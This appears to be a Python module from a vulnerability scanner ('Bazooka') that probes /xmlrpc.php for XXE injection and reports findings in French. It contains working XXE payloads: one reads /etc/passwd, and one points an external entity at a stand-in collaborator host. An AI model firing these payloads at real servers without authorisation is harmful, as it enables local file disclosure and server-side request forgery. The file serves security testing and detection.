"""XXE scanner — XML External Entity injection on xmlrpc.php."""

from __future__ import annotations

import logging
import re
import time
from typing import TYPE_CHECKING

import httpx

from core.models import Compliance, Evidence, Finding, Severity, Confidence, FindingType
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession

logger = logging.getLogger(__name__)

XXE_FILE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    '<methodCall><methodName>system.listMethods</methodName>\n'
    '<params><param><value>&xxe;</value></param></params></methodCall>'
)

XXE_OOB_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burp.collaborator-style.test/">]>\n'
    '<methodCall><methodName>system.listMethods</methodName>\n'
    '<params><param><value>&xxe;</value></param></params></methodCall>'
)

PASSWD_PATTERN = re.compile(r"root:x:0:0:|daemon:x:|/bin/(?:bash|sh)\b")


class XXEScannerModule(BazookaModule):
    name = "vuln.xxe_scanner"
    phase = "vuln"
    description = "XXE scanner on xmlrpc.php"
    profiles = ["standard", "aggressive", "bugbounty"]

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url.rstrip("/")
        target_url = f"{base}/xmlrpc.php"
        headers = {"Content-Type": "application/xml"}
        found = False

        # Test 1: file disclosure
        try:
            resp = await session.post(
                target_url,
                content=XXE_FILE_PAYLOAD,
                headers=headers,
            )
            body = resp.text
            if PASSWD_PATTERN.search(body):
                found = True
                idx = PASSWD_PATTERN.search(body).start()
                excerpt = body[max(0, idx - 50):idx + 200]
                result.add_finding(Finding(
                    id="VULN-XXE-001",
                    title="XXE confirmee sur /xmlrpc.php (lecture /etc/passwd)",
                    severity=Severity.CRITICAL,
                    cvss_score=9.1,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L",
                    confidence=Confidence.CONFIRMED,
                    finding_type=FindingType.CVE,
                    description=(
                        "L'endpoint /xmlrpc.php parse les entites XML externes (XXE) et "
                        "permet la lecture de fichiers locaux du serveur. Le contenu de "
                        "/etc/passwd a ete reflete dans la reponse."
                    ),
                    evidence=Evidence(
                        request=f"POST {target_url}\nContent-Type: application/xml\n\n{XXE_FILE_PAYLOAD}",
                        response_status=resp.status_code,
                        response_body_excerpt=excerpt,
                    ),
                    impact=(
                        "Lecture arbitraire de fichiers (wp-config.php, cles privees, logs). "
                        "Possibilite de SSRF, deni de service (Billion Laughs)."
                    ),
                    remediation=(
                        "Desactiver le chargement d'entites externes dans le parser XML. "
                        "Mettre a jour PHP/libxml. Desactiver xmlrpc.php si non utilise."
                    ),
                    compliance=Compliance(
                        owasp_2021="A05:2021 - Security Misconfiguration",
                        cwe="CWE-611",
                    ),
                    references=[
                        "https://cwe.mitre.org/data/definitions/611.html",
                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    ],
                    phase="vuln",
                    module=self.name,
                    tags=["xxe", "xmlrpc", "file-disclosure"],
                ))
        except httpx.TimeoutException:
            logger.debug("Timeout on XXE file payload")
        except httpx.ConnectError:
            logger.debug("Connect error on XXE file payload")

        # Test 2: OOB indicator via timing
        if not found:
            try:
                start = time.time()
                resp = await session.post(
                    target_url,
                    content=XXE_OOB_PAYLOAD,
                    headers=headers,
                )
                elapsed = time.time() - start
                if elapsed > 5.0:
                    result.add_finding(Finding(
                        id="VULN-XXE-002",
                        title="XXE OOB suspecte sur /xmlrpc.php (timeout indicator)",
                        severity=Severity.MEDIUM,
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        confidence=Confidence.POSSIBLE,
                        finding_type=FindingType.MISCONFIGURATION,
                        description=(
                            f"L'envoi d'une entite XML externe pointant vers un host inexistant "
                            f"a provoque un delai anormal ({elapsed:.1f}s), suggerant que le "
                            f"parser tente de resoudre l'entite (XXE potentielle, confirmation OOB requise)."
                        ),
                        evidence=Evidence(
                            request=f"POST {target_url}\n\n{XXE_OOB_PAYLOAD}",
                            response_status=resp.status_code,
                            response_body_excerpt=f"Elapsed: {elapsed:.2f}s\n{resp.text[:200]}",
                        ),
                        impact="Lecture de fichiers, SSRF si confirmee.",
                        remediation="Desactiver le chargement d'entites externes (libxml_disable_entity_loader).",
                        compliance=Compliance(
                            owasp_2021="A05:2021 - Security Misconfiguration",
                            cwe="CWE-611",
                        ),
                        phase="vuln",
                        module=self.name,
                        tags=["xxe", "xmlrpc", "oob-indicator"],
                    ))
                    found = True
            except httpx.TimeoutException:
                logger.debug("Timeout on XXE OOB payload (could indicate parsing)")
            except httpx.ConnectError:
                logger.debug("Connect error on XXE OOB payload")

        if not found:
            result.add_finding(Finding(
                id="VULN-XXE-CLEAR",
                title="Pas de XXE detectee sur /xmlrpc.php",
                severity=Severity.INFO,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.INFORMATION_DISCLOSURE,
                description="Payloads XXE (file:// et OOB) testes. Aucun signe d'evaluation d'entite externe.",
                phase="vuln",
                module=self.name,
            ))

        return result
